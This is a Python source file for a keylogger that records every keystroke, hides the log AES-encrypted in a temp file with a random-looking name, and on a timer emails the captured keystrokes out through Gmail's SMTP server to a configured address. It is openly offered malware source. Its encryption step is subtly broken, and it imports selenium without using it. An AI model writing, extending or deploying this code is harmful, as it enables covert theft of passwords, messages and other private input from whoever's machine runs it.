from pynput import keyboard
from threading import Timer
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import chdir, path, urandom, remove
from tempfile import gettempdir
from Crypto.Cipher import AES
from selenium import webdriver
from time import sleep


class Keylogger:
    def __init__(self, interval=180):
        self.log = b""
        self.interval = interval
        self._key = urandom(32)
        self._iv = urandom(16)
        self.__filename__ = 'tmp-4945565XTEeaB0Ilwh'
        self.count_mails = 0

    def set_email(self, email):
        self.email = email

    def set_password(self, password):
        self.password = password

    def send_mail(self):
        timer = Timer(self.interval, self.send_mail).start()

        if self.count_mails == 0:
            self.count_mails += 1
        else:
            self.save_file()
            chdir(gettempdir())
            line_buffer = b""

            with open(self.__filename__, "rb") as file:
                for line in file.readlines():
                    line_buffer += line

            remove(self.__filename__)
            cipher = AES.new(self._key, AES.MODE_CBC, self._iv)
            decipher_text = cipher.decrypt(line_buffer)

            server = SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, decipher_text)
            server.quit()
            self.count_mails += 1

    def process_key(self, key):
        if str(key) == "Key.enter":
            self.log += b"\n"
        else:
            self.log += bytes(str(key).encode() + " ".encode())
        print(self.log)

    def report(self):
        timer = Timer(10, self.report).start()
        self.save_file()

    def save_file(self):
        chdir(gettempdir())
        cipher = AES.new(self._key, AES.MODE_CBC, self._iv)
        with open(self.__filename__, "ab") as file:
            ciphertext = cipher.encrypt(self.log*16)
            file.write(ciphertext)

        self.log = b""

    def start(self):
        listener = keyboard.Listener(on_press=self.process_key)
        with listener:
            self.report()
            self.send_mail()
            listener.join()


keylogger = Keylogger(interval=30)
keylogger.set_email("email@gmail.com")
keylogger.set_password("password")
try:
    keylogger.start()
except KeyboardInterrupt:
    chdir(gettempdir())
    remove(keylogger.__filename__)
